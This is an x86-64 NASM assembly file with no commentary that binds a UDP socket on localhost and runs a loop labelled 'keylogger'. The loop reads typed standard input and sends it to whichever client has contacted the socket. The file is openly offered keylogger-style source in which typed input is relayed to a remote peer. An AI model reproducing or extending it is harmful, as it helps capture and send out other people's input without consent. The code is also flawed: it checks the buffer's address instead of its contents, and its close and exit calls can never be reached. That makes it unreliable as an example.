section .data
send_buffer db "hello", 10
lens equ $ - send_buffer 
optval dq 1

sockaddr:

dw 2
dw 0x4A75
dd 0x0100007F
dq 0




section .bss
recv_buffer resb 10
len_addr resq 1
client_addr resb 16
keylogger_buffer resb 10


section .text
global _start


keylogger:

;read syscall 

mov rax, 0
mov rdi, 0
mov rsi, keylogger_buffer
mov rdx, 10
syscall

mov r13, keylogger_buffer
cmp r13, 0
je keylogger

mov r14, [keylogger_buffer]

;write syscall

mov rax, 1
mov rdi, 1
mov rsi, keylogger_buffer
mov rdx, 10
syscall

jmp send_syscall



_start:
;socket syscall

mov rax, 41
mov rdi, 2
mov rsi, 2
mov rdx, 0
syscall

mov r12, rax

;socketoption

mov rax, 54
mov rdi, r12
mov rsi, 1
mov rdx, 2
mov r10, optval
mov r8, 8
syscall

;bind syscall

mov rax, 49
mov rdi, r12
mov rsi, sockaddr
mov rdx, 16
syscall


;recv syscall

mov qword [len_addr], 16

mov rax, 45
mov rdi, r12
mov rsi, recv_buffer
mov rdx, 10
mov r10, 0
mov r8, client_addr
mov r9, len_addr
syscall

;write syscall

mov rax, 1
mov rdi, 1
mov rsi, recv_buffer
mov rdx, 10
syscall

jmp keylogger

send_syscall:

;send syscall

mov rax, 44
mov rdi, r12
mov rsi, keylogger_buffer
mov rdx, 10
mov r10, 0
mov r8, client_addr
mov r9, 16
syscall

jmp keylogger





;close syscall

mov rax, 3
mov rdi, r12
syscall

;exit syscall

mov rax, 60
mov rdi, 0
syscall

